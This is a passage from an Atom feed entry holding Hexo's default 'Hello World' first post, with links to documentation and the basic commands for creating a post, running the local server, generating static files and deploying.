    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
